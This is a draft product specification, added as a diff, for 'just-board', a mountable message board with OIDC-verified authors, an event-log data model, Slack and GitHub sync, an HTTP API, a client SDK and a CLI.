@@ -1,0 +1,1272 @@
+# just-board — v1 spec (draft)
+
+A message board you mount in one route. It has one durable log, verified
+authors, channels and threads, a live tail, and optional two-way sync with Slack
+and GitHub. The npm package `just-board` ships the server, the client SDK, and
+the CLI. The API sits under the SDK, and the SDK sits under the CLI.
+
+```ts
+// app/api/board/[...path]/route.ts
+import { board } from 'just-board/server'
+import { redisHttp } from 'experimental-a2/store-redis-http' // or store-postgres, store-redis, store-sqlite
+
+export const { GET, POST } = board({ store: redisHttp() })
+```
+
+`store` accepts any A2 store. If you omit it, you get A2's defaults: SQLite at
+`.a2/dev.db` in development, memory in tests, and a startup error in
+production.
+
+```bash
+export JUST_BOARD_URL=https://www.example.com/api/board
+just-board post errors-www "deploy failed on a1b2c3"
+```
+
+## The model
+
+1. **A board is one log**, mounted in one route of one Vercel project. To get a
+   second board, mount a second route.
+2. **Every request carries an OIDC token.** People get theirs from their
+   `vercel login`, and machines get theirs from their platform. The board
+   trusts its own project, plus `trustedSources`.
+3. **Every event records who wrote it**: a verified principal, plus an
+   optional profile, such as an agent acting for a person.
+4. **A thread syncs with a set of external threads.** A message written in the
+   thread, wherever it was written, is delivered to every one of those external
+   threads except the one it came from.
+5. **Sync is configured per platform, keyed by the platform's own things.**
+   Slack sync is keyed by Slack channels, and GitHub sync is keyed by repos. A
+   key maps either to a board channel, which makes a two-way mirror, or to a
+   function, which handles inbound events however you like.
+
+## Principles
+
+- **One board is one trust boundary.** A board has no per-channel ACLs, no
+  roles, and no member list. If some content needs a private space, mount a
+  second board.
+- **No accounts.** The board has no login page, sessions, or user table.
+  Principals are strings derived from verified OIDC claims or from verified
+  platform webhooks.
+- **Provenance is server-authored.** The `by`, `mentions`, `origin`, and
+  sync receipt fields are never taken from the request body. This is the same
+  rule as Just Chat's trusted message metadata.
+- **Wiring is code; the log holds facts.** Sync mappings and handlers live in
+  `board()` config, where they're reviewed and deployed. They're never stored as
+  data in the log.
+- **Everything is legible in plain text.** Actor IDs are readable strings, not
+  hashes. Message IDs and cursors are the same numbers. The CLI is a product
+  constraint, not a lesser frontend.
+- **The log is the only source of truth.** Every view is an A2 reducer, and
+  reducer snapshots are caches. Deleting them is always safe. The MVP has no
+  SQL tables and no second data model.
+- **The board log holds facts people read.** It's one log, deliberately, because
+  that gives one global order, reducers that see everything, and atomic
+  batches. Keeping it lean is our side of the bargain: bookkeeping lives in side
+  contracts (read cursors, raw platform events), and scaling one log to
+  millions of events is A2's job.
+- **One store, one scheduler.** Everything the board persists goes through the
+  A2 `store`, and every background job goes through the A2 `scheduler`. Sync
+  needs no state store of its own.
+- **One client.** The CLI, your scripts, and sync handlers all use the same
+  just-board client. Only the transport and the defaults differ.
+- **Fan-out is not a read path.** Handlers exist only to work with external
+  systems: running inbound mappings and delivering outbound messages.
+  Inbox-style views are queries.
+
+## Package layout
+
+One package, `just-board`, with subpath exports:
+
+| Import | Contents | Runtime |
+| --- | --- | --- |
+| `just-board` | `createClient()`, the typed client, and its types. The `node` build also detects the URL and token (see [Client SDK](#client-sdk)) | isomorphic |
+| `just-board/server` | `board()` and the trust helpers (`vercel()`, `githubActions()`) | server |
+| `just-board/slack` | `slack()`, the Slack sync adapter | server |
+| `just-board/github` | `github()`, the GitHub sync adapter | server |
+| `just-board/contract` | The A2 contract, API schemas, and pure reducers | isomorphic |
+| bins `just-board`, `jb` | The CLI, built only on `just-board`. `jb` is a short alias | Node ≥ 22 |
+
+### Install
+
+```bash
+pnpm i just-board experimental-a2                     # a board: log, API, SDK, CLI
+pnpm i chat @chat-adapter/slack @chat-adapter/github  # + sync with Slack and/or GitHub
+pnpm i @vercel/connect                                # optional: Connect credentials instead of env secrets
+```
+
+Only the first line is needed to run the CLI against an existing board, e.g.
+with `npx just-board`.
+
+**Dependencies:**
+
+- **Peer, required: `experimental-a2`.** You import your store and scheduler
+  from it (e.g. `experimental-a2/store-redis-http`), and they must be the same
+  copy that just-board uses.
+- **Peers, optional: `chat`, `@chat-adapter/slack`, `@chat-adapter/github`.** They
+  are loaded only by `just-board/slack` and `just-board/github`. Your adapters
+  must match the `chat` version that just-board builds its Chat instances with.
+- **Installed by you, optionally: `@vercel/connect`.** You don't install a Chat
+  SDK state adapter, because just-board backs Chat SDK's state with the A2 store
+  (see [Sync](#sync)).
+- **Regular dependencies:** `zod` (v4), `jose` for JWT and JWKS verification,
+  and `@vercel/oidc` for client-side token minting.
+
+## API technology (decision)
+
+- **Zod v4 schemas are the single source.** A route table of
+  `{ method, path, query, body, response }` drives server validation, the
+  typed client (types are inferred, with no codegen), and `GET /openapi.json`
+  via `z.toJSONSchema`.
+- **The router is hand-rolled over the Fetch API.** It is about 100 lines with
+  no framework. `board()` returns fetch handlers, so it runs in a Next.js route,
+  a Vercel function, or any fetch runtime. A2 already speaks Standard Schema,
+  so the contract and the API share validators.
+- **Only GET and POST are used.** The mount is always
+  `export const { GET, POST }`, and every mutation is a POST to a resource path.
+- **A2's `server.fetch` is never exposed.** All writes go through the board API
+  so that `by` and the other provenance fields stay server-authored.
+
+The alternative is oRPC, which provides OpenAPI and a typed client over Standard
+Schema. It is reasonable if we'd rather not own the router, but the surface is
+small enough that owning it keeps the dependency tree and the wire format
+simple.
+
+## Identity and auth
+
+### Tokens
+
+Every request sends `Authorization: Bearer <OIDC JWT>`. **Every token's `aud`
+is the board's URL** (`https://www.example.com/api/board`, as returned by
+discovery), so a token sent to one board can't be replayed anywhere else. That
+includes another board mounted on the same origin. The one exception is `/webhooks/:name`, which is authenticated
+by the platform adapter (see [Sync](#sync)).
+
+In Node, the client finds a token in this order, and the first match wins.
+Other runtimes pass `token` explicitly (see [Client SDK](#client-sdk)).
+
+| Where | How | Principal |
+| --- | --- | --- |
+| Explicit | `JUST_BOARD_TOKEN` (any OIDC JWT; for other CI systems and tests) | depends on the issuer |
+| GitHub Actions | `ACTIONS_ID_TOKEN_REQUEST_URL`, with audience set to the board URL (needs `permissions: id-token: write`) | `github:repo:<repository_id>` |
+| A Vercel deployment | `@vercel/oidc` `getVercelOidcToken({ audience })` | `vercel:project:<project_id>:<env>` |
+| A local terminal | `@vercel/oidc` `refreshToken({ project, team })` with the board's IDs, then an exchange for the board's audience | `vercel:user:<user_id>` |
+
+- **Local minting uses the Vercel CLI login.** `refreshToken` reads the CLI
+  credentials, or calls `vercel project token <id>` when they're in the
+  keyring. It then calls `api.vercel.com/v1/projects/<id>/token` and caches the
+  result. Vercel only mints this token for accounts that can access the
+  project, so **access to the board equals access to its Vercel project**.
+- **The `user_id` claim identifies the person.** On development tokens it holds
+  the ID of the user the token was issued to. It exists only on development
+  tokens, and that's exactly the case we use it for.
+- **Discovery:** `GET /` is unauthenticated and returns
+  `{ team_id, project_id, issuer, audience }`, so the client knows which project
+  to mint for. The CLI can run from any directory.
+- **Preview protection:** if `VERCEL_AUTOMATION_BYPASS_SECRET` is set, the client
+  sends `x-vercel-protection-bypass`. Otherwise every CI run against a protected
+  preview hits Vercel's login page.
+
+**Verified (2026-10-01): the exchange keeps `user_id`.** We exchanged a
+development token from `@vercel/oidc` 3.8.5 for a custom audience
+(`oidc.vercel.com/~token`). The exchanged token:
+- has `aud` set to the requested audience
+- keeps the same `iss`, `sub`, `user_id`, and 12-hour lifetime
+- adds an `act` claim recording the exchange
+
+So the CLI never sends a token that's valid anywhere except the board it's
+talking to.
+
+### Server verification
+
+- **Vercel tokens:**
+  - Verify with `jose` against the team issuer's JWKS
+    (`https://oidc.vercel.com/<team>`).
+  - `aud` must be the board's URL.
+  - Tokens from the board's own project are trusted. `project_id` is compared to
+    `VERCEL_PROJECT_ID`, or to `board({ project })` in local development.
+  - A `development` token is a person and must carry `user_id`. Any other
+    environment is the deployment itself.
+- **GitHub tokens:** verify against `https://token.actions.githubusercontent.com`.
+  A GitHub token is accepted only if it matches a `trustedSources` entry.
+- **Tokens from other Vercel projects** are accepted only if they match a
+  `trustedSources` entry.
+- **Tests** pass `board({ issuers })` in code, which points verification at a
+  local test issuer. Verification still runs `jose` against a real JWKS, and
+  there's no bypass reachable through env. Local development needs no bypass
+  either, because development tokens are real.
+
+```ts
+board({
+  store: postgres(),
+  trustedSources: [
+    vercel({ project: 'marketing', environments: ['production'] }),
+    githubActions({ repository: 'basehub-ai/www', workflow: '.github/workflows/deploy.yml', can: ['post'] }),
+  ],
+})
+```
+
+- **Matching uses names for readability** (`project`, `repository`, `workflow`).
+  Renaming a project or repo changes those claims, so the principal is stored by
+  ID (`project_id`, `repository_id`).
+- **`githubActions()` matches the `repository`, `event`, `workflow`, and `ref`
+  claims.** A `pull_request` run's token carries `ref: refs/pull/<n>/merge`, so a
+  rule pinned to `refs/heads/main` rejects it. Match on `event` and `workflow`
+  instead.
+- **Keep `can` narrow for `pull_request` rules.** For `pull_request`, GitHub runs
+  the workflow file from the PR's merge commit, so anyone who can open a PR can
+  change what it posts. Fork PRs get no OIDC token at all. For PR activity, the
+  GitHub sync adapter is usually the better tool (see [GitHub](#github)).
+
+### Principals, profiles, actors
+
+- **Principal:** who holds the credential. It is canonical, stable, and legible:
+  - `vercel:user:u_abc123`
+  - `vercel:project:prj_x:production`
+  - `github:repo:123456` (an Actions workflow)
+  - `github:user:583231` (a GitHub user, arriving through sync)
+  - `slack:T0123:U0456` (a Slack user, arriving through sync)
+
+  Principals name the platform identity, so they don't include sync keys.
+- **Profile:** an optional named identity within a principal, with an avatar.
+  It's Just Chat's delegated profile, slimmed down.
+  - **Selection:** `profile: 'claude'` in the SDK, `--as claude` in the CLI.
+  - **Detection:** agent environments are detected automatically, using the
+    same signals as the Just Chat CLI: `CLAUDECODE`/`CLAUDE_CODE_SESSION_ID`,
+    `CODEX_THREAD_ID`, and `GROK_SESSION_ID`. `--human` turns detection off.
+  - **Avatars:** detected agents (Claude, Codex, Grok) get built-in avatars,
+    which the board serves as SVGs from its own mount at `/avatars/<name>`. Any
+    other profile can pass an HTTPS avatar URL. HTTP is allowed only on
+    localhost.
+  - **What a profile gets:** its own actor, handle, mentions, and read cursors.
+    It's always displayed together with its principal: **claude via julian**.
+  - **What it doesn't get:** permissions of its own (authorization always uses
+    the verified principal), a separate login (it shares the principal's
+    token), or a registration step (its first write records it in
+    `actor.seen`).
+- **Actor:** the thing messages are attributed to. Its ID is `principal` or
+  `principal+profile`, for example `vercel:user:u_abc123+claude`. Profile names
+  match case-insensitively, so `Claude` and `claude` are the same actor, and the
+  spelling supplied is the one displayed. Runtime session IDs are recorded as
+  metadata on each message, not as part of the identity. They do scope read
+  cursors, so two parallel agent tasks don't consume each other's unread
+  messages (see [Cursors](#cursors)).
+
+**Authorization in v1:**
+
+- People and the board's own deployments can do everything.
+- `trustedSources` entries can do what their `can` lists, which defaults to
+  everything. The `can` values are:
+
+  | Value | Allows |
+  | --- | --- |
+  | `post` | posts and replies |
+  | `react` | reactions |
+  | `label` | labels |
+  | `sync` | attaching a thread to an external thread |
+
+- Only the principal that wrote a message may edit or delete it. A person can
+  edit their own profiles' messages.
+- Sync handlers are your own server code, so they're trusted. Their writes are
+  authored by the external actor that triggered them (see
+  [Inbound handling](#inbound-handling)).
+
+### Handles and mentions
+
+- **Handles are display hints, not reservations.**
+  - A person's handle is sent by the CLI. It defaults to their Vercel username,
+    fetched with the same CLI login, and can be overridden with `--handle`.
+  - A profile's handle is `<person-handle>/<profile>`, for example
+    `julian/claude`.
+  - A deployment's handle is its project name, plus `@<env>` outside
+    production.
+  - An Actions principal's handle is `owner/repo`.
+  - A GitHub user's handle is their login. A Slack user's handle is their Slack
+    display name.
+- **Syntax:**
+  - `@handle` and `@person/profile`. The parser is a port of Just Chat's
+    `extractMentions`, extended to allow one `/`.
+  - Mentions inside inline code or fenced code blocks don't count, the same
+    invariant as Just Chat.
+  - `@[actor-id]`, e.g. `@[slack:T0123:U0456]`, mentions an exact actor. It's
+    the escape hatch for ambiguous handles.
+- **Resolution** happens inside the write request, before the append:
+  1. Extract the tokens from the prose.
+  2. Look each one up in the `actors` reducer's `byHandle` index (lowercased
+     handle → actor IDs).
+  3. Exactly one match resolves. Zero is `error: unknown mention @x`. More than
+     one is `error: ambiguous mention @x`, listing the actor IDs to use with
+     `@[…]`.
+  4. Store the actor IDs on the event. Edits resolve again.
+
+  There's no separate cache. The `actors` state is small, A2 snapshots it, and
+  a warm function keeps an in-memory copy keyed by log index that it updates
+  incrementally.
+- **Only actors the board has seen can be mentioned.** An actor becomes known
+  when it writes or reacts, or when it's mentioned on its own platform. A Slack
+  user who has never interacted with a synced channel can't be @-mentioned from
+  the board in v1.
+- **Mentions are stored as actor IDs**, so a later handle change never reroutes
+  an old mention. Display always uses the current name. A new actor appearing
+  between resolution and the append doesn't change the stored ID.
+- **Platform round-trips:**
+  - **Inbound mentions resolve on their own platform.** A Slack `<@U0456>`
+    becomes `slack:T0123:U0456`. A GitHub `@login` resolves only among
+    `github:user:` actors, so it never lands on a same-named Slack user.
+  - **If an inbound mention names an actor the board hasn't seen,** the inbound
+    handler fetches that user's profile through the adapter and appends
+    `actor.seen` in the same batch.
+  - **Outbound mentions render natively on the actor's own platform:**
+    `<@U0456>` in Slack, `@login` on GitHub. Anywhere else a mention is the
+    plain name.
+
+## Entities
+
+| Entity | Identity | Lifecycle |
+| --- | --- | --- |
+| Board | implicit; one per mount | none |
+| Actor | the principal plus an optional profile | folded from `actor.seen` |
+| Channel | a path: `errors-www`, `www/production` | created by the first post, local or synced; the path never changes |
+| Message | its log index (`#812`) | posted, then edited or deleted (tombstoned) |
+| Thread | the index of its root message | a single level; `re` always points at the root, and `replyTo` keeps the exact message replied to |
+| Reaction | (message, emoji, actor) | added or removed |
+| Label | (message, key) → value | set or unset; each key holds one value |
+
+- **Channel paths** are one or more segments matching
+  `[a-z0-9][a-z0-9_-]*`, joined by `/`, up to 80 characters in total. Prefixes
+  are display groups.
+- **Message IDs are the log index of the `message.posted` event.** They're
+  short, stable, unique within the board, and double as cursors. Other events
+  also consume indexes, so message IDs have gaps.
+- **Replies:** a client replies to any message with `re: <id>`. The server stores
+  the thread root as `re` and the original target as `replyTo` when the two
+  differ. Platforms that have sub-threads use `replyTo` (see
+  [GitHub](#github)).
+- **External IDs** are prefixed with the sync key, not the platform:
+  - `slack:C0123ABC` is a channel.
+  - `slack:C0123ABC:1727.1234` is a thread.
+  - `acme:C0999XYZ:1727.9` is a thread in a second Slack workspace keyed `acme`.
+  - `github:basehub-ai/www:123` is a PR thread.
+
+  Wherever an external target is accepted, `slack:#prs` also works and resolves
+  through a cached name lookup.
+- **Emoji are stored as normalized short names** (`eyes`, `white_check_mark`),
+  using Chat SDK's emoji normalization. The CLI accepts `eyes`, `:eyes:`, or 👀.
+- **Labels:** keys match `[a-z0-9][a-z0-9_.-]*` (up to 64 characters); values are
+  strings (up to 256 characters). They are intended for triage state such as
+  `status=planned` and `dup-of=640`.
+- **Limits:** message text is at most 10,000 characters.
+
+## A2 contract
+
+The board uses one contract and one session, `board`. Fields marked
+**(server)** are never accepted from a client.
+
+```ts
+export const boardContract = contract({
+  name: 'just-board',
+  events: {
+    'message.posted': z.object({
+      channel: ChannelPath,
+      text: MessageText,
+      re: MessageId.nullable(),             // the thread root
+      replyTo: MessageId.nullable(),        // the exact message replied to, when it isn't the root
+      labels: Labels.default({}),
+      noSync: z.boolean().default(false),   // keep this message on the board
+      mentions: z.array(ActorId),           // (server)
+      by: Author,                           // (server) { actor, principal, profile, session? }
+      origin: Origin.nullable(),            // (server) { thread, message, context? } when it came from a platform
+    }),
+    'message.edited':    z.object({ id: MessageId, text: MessageText, mentions: z.array(ActorId), by: Author }),
+    'message.deleted':   z.object({ id: MessageId, by: Author }),
+    'reaction.added':    z.object({ id: MessageId, emoji: Emoji, by: Author }),
+    'reaction.removed':  z.object({ id: MessageId, emoji: Emoji, by: Author }),
+    'labels.changed':    z.object({ id: MessageId, set: Labels, unset: z.array(LabelKey), by: Author }),
+    'thread.synced':     z.object({ root: MessageId, target: ExternalTarget, cause: z.enum(['config', 'request']), by: Author }),
+    'message.synced':    z.object({ id: MessageId, target: ExternalTarget, external: ExternalMessage }), // (server)
+    'actor.seen':        z.object({ actor: ActorId, kind: ActorKind, handle: Handle, name: z.string(), avatar: z.string().url().optional() }),
+  },
+})
+
+// Raw platform events live outside the board log, one session per external channel:
+// inbox:slack:C0123ABC, inbox:github:basehub-ai/www, …
+export const inboxContract = contract({
+  name: 'just-board-inbox',
+  events: {
+    'external.received': z.object({ event: ExternalEvent, raw: z.unknown() }), // (server)
+  },
+})
+```
+
+- **The board log holds only board facts.** Bookkeeping lives in side
+  contracts: read cursors in `just-board-cursors` (see [Cursors](#cursors)) and
+  raw platform events in `just-board-inbox`.
+- **Idempotency:**
+  - A client may supply an event `id` on any write, and A2 deduplicates it.
+  - `external.received` uses the platform's event or message ID as its event
+    ID. A2 event IDs are unique across the whole store, so platform retries do
+    nothing.
+  - Board writes made by handlers derive their IDs from the triggering inbox
+    event (see [Inbound handling](#inbound-handling)).
+- **Actor profiles:** `actor.seen` is appended in the same batch as an actor's
+  write, and only when the actor is new or its display details changed.
+- **Edits and deletes:** deleted messages become tombstones and drop their
+  reactions. Later edits to a deleted message are ignored. This is the same
+  invariant as Just Chat.
+- **The event feed hides bookkeeping (`actor.seen`, `message.synced`) by default.** `tail --all` shows every
+  board event. To see raw platform events, use `jb inbox`.
+
+### The sync events
+
+```
+inbound   Slack ─▶ /webhooks/slack ─▶ inbox: external.received ─▶ inbound handler ─▶ board: message.posted {origin}
+outbound  jb reply ─▶ message.posted ─▶ outbound handler ─▶ Slack ─▶ message.synced
+attach    jb sync ─▶ thread.synced ─▶ outbound handler ─▶ Slack (root + backfill) ─▶ message.synced …
+```
+
+**`thread.synced { root, target, cause, by }`** records that a thread is synced
+with an external target. It's the only way the log says so.
+
+- **Where it comes from:**
+  - **At creation.** A root's targets, from the config mirror (`cause:
+    'config'`) or from `--sync` (`cause: 'request'`), are appended as
+    `thread.synced` events in the same batch as the root's `message.posted`.
+  - **Later.** `jb sync <id> <target>`, `board.sync()`, or a handler passing
+    `sync:` appends one on its own, recording who did it.
+- **How the outbound handler acts on it:**
+  - **A channel target** (`slack:C0123ABC`) starts a new external thread. The
+    handler posts the root, then backfills the replies in order.
+  - **A thread target** (`github:owner/repo:123`) joins an existing external
+    thread. The root isn't posted, because the external thread has its own, and
+    only messages written after the join are delivered.
+
+**`external.received { event, raw }`** is the inbound inbox. It lives in the
+`just-board-inbox` contract, not the board log. The webhook route has the
+adapter verify the request, appends this event to the external channel's inbox
+session, and answers 200.
+
+- **The event ID is the platform's event or message ID.**
+- **It holds** the normalized event (a message, reaction, edit, or delete, or a
+  GitHub lifecycle event) plus the raw payload, which handler functions receive
+  as `raw`.
+- **It exists because handlers run later.** A pushed webhook can't be fetched
+  again, so it has to be stored before the board answers. Storing it gives four
+  things:
+  - **Durability.** The mirror or your function runs as an A2 handler, with
+    retries and crash recovery, not inside Slack's 3-second webhook window.
+  - **Dedupe.** A platform retry reuses the same event ID, so it does nothing.
+  - **Debugging.** `jb inbox` shows exactly what a platform sent.
+  - **Ordering.** Each external thread has its own lane in the inbox session.
+- **Why it isn't in the board log:**
+  - Raw payloads (tens of KB for GitHub) and a second event per inbound message
+    would otherwise roughly double synced traffic in the log people read.
+  - Every `tail` subscriber and the `messages` fold would have to process them.
+- **Inbox sessions are disposable.** They can get a retention policy without
+  touching the board log.
+
+**`message.synced { id, target, external }`** is the outbound receipt. The
+outbound handler returns it after the platform accepts the post, and it's
+committed atomically with the handler's completion.
+
+- **Copy map.** It maps a board message to its copy on the platform, so later
+  edits, deletes, and reactions reach the right external message.
+- **Thread linking.** A board root posted into a Slack channel gets a Slack
+  timestamp. The root's receipt is how the `sync` reducer learns that the thread
+  now lives at `slack:C0123ABC:1727.1234`, so Slack replies route back to it.
+- **Retry guard.** Before posting, the handler checks for an existing receipt
+  for that message and target. The only remaining duplicate window is between
+  the platform accepting the post and the receipt committing.
+- **Echo guard.** An inbound event that matches a receipt is the board's own
+  post coming back, and it's skipped.
+
+`origin`, on messages that came in from a platform, is the inbound counterpart:
+it records the external-to-board direction.
+
+**Handlers.** There are two, and both exist only when `sync` is configured.
+
+| Handler | Runs on | Lane |
+| --- | --- | --- |
+| inbound | `external.received`, in the external channel's inbox session | the external thread, after `threadGroup`, so one thread's platform events stay in order |
+| outbound | board writes in synced threads, and `thread.synced` | `thread:<root>`, so deliveries stay in order and an attach backfills in order |
+
+Sync needs a scheduler, either `experimental-a2/scheduler-vercel` or
+`experimental-a2/scheduler-qstash`. A board without sync needs a store and
+nothing else.
+
+## Reading state
+
+Every read is a fold of the single session through A2 reducers. There are no
+tables. The reducers are defined in `just-board/contract` and cached by A2's
+snapshots.
+
+| Reducer | State | Used by |
+| --- | --- | --- |
+| `channels` | path → last index, message count | `channels`, channel validation |
+| `actors` | actor → handle, name, avatar, kind; plus a `byHandle` index of lowercased handle → actor IDs | mention resolution, `actors`, rendering |
+| `sync` | thread root → external threads; external thread group → root; message → external copies | both sync handlers |
+| `messages` | message → current text, thread, reply target, labels, reactions, tombstone | `read`, `/messages` filters, event-feed filters |
+
+- **Consistency:** every response reports the log index it reflects, as A2's
+  `state()` does. Writes return their message ID, so any later read already
+  includes the write.
+- **Filters** (`channel`, `re`, `by`, `mentions`, `label`) are evaluated in
+  memory over the `messages` state.
+- **The event feed** starts from `state(messages, { through: after })` and folds
+  each new event as it streams. That fold is what gives it the before-or-after
+  view of each change. When no checkpoint exists at or before `after`, A2
+  refolds from the start of the log.
+- **Small reducers stay separate from `messages`,** so resolving a mention or
+  syncing a reply never has to fold the largest state.
+
+**The ceiling.** The `messages` snapshot is one JSON value that is rewritten
+after catch-up reads. That's fine for thousands of messages and too heavy for
+hundreds of thousands. The plan when a board outgrows it is row-shaped
+projections: reducers that fold into rows keyed by ID, caught up to a stored
+high-water index. Ideally that becomes an A2 primitive, not board-specific code.
+It's not in the MVP.
+
+**Store support:** any A2 store.
+
+| Store | Typical use |
+| --- | --- |
+| `postgres()` | production |
+| `redis()` / `redisHttp()` | production (Upstash via `redisHttp`) |
+| SQLite | development (A2's default `.a2/dev.db`) |
+| memory | tests |
+
+## Cursors
+
+"What's new since I last looked" is stored on the server, per reader, so agents
+in throwaway sandboxes don't lose their place.
+
+- **Key:** a cursor is identified by three things:
+  - the actor
+  - the runtime session, when one is detected
+  - the scope: a channel path, `mentions`, or `*` for the whole board
+
+  `--no-session` drops the session part, so every session of the actor shares
+  one cursor.
+- **Storage:** a separate A2 contract, `just-board-cursors`, with one session
+  per actor (`cursors:<actor>`) and one event type:
+  `cursor.moved { scope, session, index }`.
+  - It's kept out of the board log, so reading never adds noise to the log.
+  - A reader only ever writes its own session, so no fan-out is involved.
+  - A cursor only moves forward; a `cursor.moved` with a lower index is
+    ignored.
+- **Reading with `since: 'last'`** resolves to the stored cursor for that scope.
+  If there's none yet, it starts from the current head.
+- **Acknowledging.** The response includes the new `cursor`, and the reader
+  acknowledges it after it has handled the results. That makes delivery
+  at-least-once: a reader that dies before acknowledging sees those messages
+  again. The CLI acknowledges after printing.
+- **Explicit `after: N` never moves a cursor.** Historical reads don't count as
+  reading.
+- **Filters inside a scope don't change what counts as seen.** Messages that a
+  label filter skips are still behind the cursor once it's acknowledged.
+
+## HTTP API
+
+All paths are relative to the mount. Responses are JSON; errors look like
+`{ "error": { "code": "channel_not_found", "message": "…" } }` with a matching
+status.
+
+| Method | Path | Purpose |
+| --- | --- | --- |
+| GET | `/` | Discovery (unauthenticated): `team_id`, `project_id`, `issuer`, `audience`, `version` |
+| GET | `/me` | The resolved actor for this token and profile |
+| GET | `/avatars/:name` | Built-in SVG avatars for detected agents (unauthenticated) |
+| GET | `/channels` | Channels with `last_index`, `messages`, and their mirrored external channels |
+| GET | `/actors` | Actors with their handles (used for mention completion) |
+| GET | `/messages` | Lists messages. Filters: `channel`, `re`, `by`, `mentions`, `label`, `after`, `before`, `limit` |
+| GET | `/messages/:id` | One message, plus its thread and sync targets when it is a root |
+| POST | `/messages` | Post or reply: `{ channel?, re?, text, labels?, sync?: ExternalTarget[], noSync?: true, id? }`. A post needs `channel`; a reply needs `re` |
+| POST | `/messages/:id/edit` | `{ text }` |
+| POST | `/messages/:id/delete` | `{}` |
+| POST | `/messages/:id/reactions` | `{ emoji, remove?: true }` |
+| POST | `/messages/:id/labels` | `{ set?, unset? }` |
+| POST | `/messages/:id/sync` | `{ target }`: attach the message's thread to an external target and backfill it |
+| GET | `/events` | The event feed: SSE when `Accept: text/event-stream`, otherwise a JSON long-poll with `wait=<s>`. Takes the same filters as `/messages`, plus `after` and `all` |
+| GET | `/inbox/:key` | Raw platform events for a sync entry, newest first. Filters: `channel`, `limit`. Needs full access: `trustedSources` entries restricted by `can` can't read it |
+| GET | `/cursors` | The caller's cursors, for this session |
+| POST | `/cursors` | `{ scope, index }`: acknowledge reading up to `index` |
+| POST | `/webhooks/:name` | Platform ingress for the sync entry `name` (e.g. `/webhooks/slack`). Takes no board token; the adapter authenticates the request |
+| GET | `/openapi.json` | Generated from the route table |
+
+**Filters:**
+- `channel=www/` (with a trailing slash) matches a whole subtree.
+- `mentions=me` resolves to the caller's actor.
+- `label=status=open` may be repeated; repeated labels are combined with AND.
+- `since=last` reads from the caller's stored cursor for the scope (see
+  [Cursors](#cursors)). It works on `/messages` and `/events`.
+- The profile is sent as `x-board-profile`, `x-board-avatar`, and
+  `x-board-session`, and the server records them after verifying the token.
+
+**Event feed:**
+- SSE frames carry `id: <index>`, so `Last-Event-ID` resumes exactly where the
+  client left off.
+- The server closes a stream before the platform's time limit, and the client
+  reconnects.
+- A long-poll holds for no more than the platform's time limit and returns
+  `{ events, cursor }`.
+- **Filter semantics:** a label or reaction event is delivered if its message
+  matched the filter either **before or after** the change, so a subscriber sees
+  messages both entering and leaving its view.
+
+## Client SDK
+
+```ts
+import { createClient } from 'just-board'
+
+const board = createClient()   // Node: URL from JUST_BOARD_URL, token detected
+
+const claude = createClient({ profile: 'claude' })   // posts as "claude via julian", built-in avatar
+const bot = createClient({ profile: { name: 'deploy-bot', avatar: 'https://example.com/bot.png' } })
+
+const msg = await board.post('errors-www', 'deploy failed')   // or { text, labels, sync, noSync, id }
+await board.reply(msg.id, 'rolled back to d4e5f6')
+await board.react(msg.id, 'eyes')
+await board.label(msg.id, { set: { status: 'investigating' } })
+await board.sync(msg.id, 'slack:#incidents')                  // escalate this thread
+
+const page = await board.messages({ channel: 'errors-www', after: 800, limit: 50 })
+
+const unread = await board.messages({ channel: 'firehose-www', since: 'last' })
+// … handle unread.messages …
+await unread.ack()                                            // move my cursor to unread.cursor
+
+for await (const event of board.events({ channel: 'errors-www', after: page.cursor })) { /* … */ }
+const reply = await board.wait({ re: msg.id, after: msg.id, timeout: '30m' }) // resolves null on timeout
+```
+
+- **`url` and `token` are optional in Node.** The package's `node` export
+  condition includes detection: `JUST_BOARD_URL`, then the token order in
+  [Tokens](#tokens). In browser and edge builds there's no detection, so you
+  pass both: `createClient({ url, token: () => … })`. `token` is any function
+  that returns an OIDC JWT.
+- **`profile`** is a name or `{ name, avatar }`. Detected agents fill it in
+  automatically unless you pass `profile: null`, which is the SDK's `--human`.
+- `post(channel, input)` and `reply(id, input)` accept a string or an object.
+- **This is the only client.** The CLI is built on it, and sync handlers receive
+  it as `board`.
+
+## CLI
+
+### Principles
+
+- **No login command.** The CLI mints tokens from the environment: your Vercel
+  login, GitHub Actions, or the Vercel runtime. If there's no usable
+  credential, it prints one line saying which command fixes it.
+- **Human-readable output on a TTY; `--json` gives JSONL**, one object per
+  message or event.
+- **Errors are one stderr line, and every exit code has one meaning:**
+
+  | Code | Meaning |
+  | --- | --- |
+  | 0 | success |
+  | 1 | error, e.g. `error: channel not found: errors-ww` |
+  | 2 | usage error |
+  | 124 | `wait` timed out (the GNU `timeout` convention) |
+
+- **Writes print the new message ID on stdout.** Because IDs are also cursors,
+  a script can chain them directly, e.g. `wait --after "$id"`.
+- **IDs are always accepted as bare numbers.** Output shows `#812`, but in a
+  shell an unquoted `#` starts a comment, so every example uses `812`.
+
+### Configuration
+
+| Setting | Flag | Env | Default |
+| --- | --- | --- | --- |
+| Board URL | `--url` | `JUST_BOARD_URL` | the value saved by `just-board use <url>` |
+| Token | none | `JUST_BOARD_TOKEN` | detected (see [Tokens](#tokens)) |
+| Profile | `--as <name>` | `JUST_BOARD_AS` | detected from the agent environment |
+| Profile avatar | `--avatar <url>` | `JUST_BOARD_AVATAR` | built-in for detected agents; otherwise none |
+| Disable profile detection | `--human` | none | off |
+| Handle | `--handle <h>` | `JUST_BOARD_HANDLE` | your Vercel username |
+| Share cursors across sessions | `--no-session` | none | a detected session gets its own cursors |
+| Output format | `--json` | none | human output |
+
+### Commands
+
+```
+just-board whoami                                   who am I, on which board, and when my token expires
+just-board use <url>                                save the default board
+
+just-board channels                                 channels and what they mirror, grouped by path prefix
+just-board actors                                   actors and their handles
+
+just-board read <channel> [filters] [--limit N]     threads in a channel, newest last
+just-board read <id>                                one thread
+
+just-board post <channel> "<text>" [--label k=v]... [--sync <target>]... [--no-sync] [--id <key>]
+just-board reply <id> "<text>" [--no-sync] [--id <key>]   <id> may be any message in the thread
+just-board edit <id> "<text>"
+just-board delete <id>
+just-board react <id> <emoji> [--remove]
+just-board label <id> k=v... [--unset k]...
+just-board sync <id> <target>                       attach the thread to an external target, backfilling it in order
+
+just-board inbox <key> [channel] [--limit N]        raw platform events, for debugging sync ("did Slack send it?")
+
+just-board tail [channel] [filters] [--all]         live, until Ctrl-C
+just-board wait [channel] [filters] [--timeout 30m] block for the next match, print it, then exit
+```
+
+- **Targets:** a channel target (`slack:#incidents`) starts a new thread there.
+  A thread target (`github:basehub-ai/www:123`) joins that existing thread.
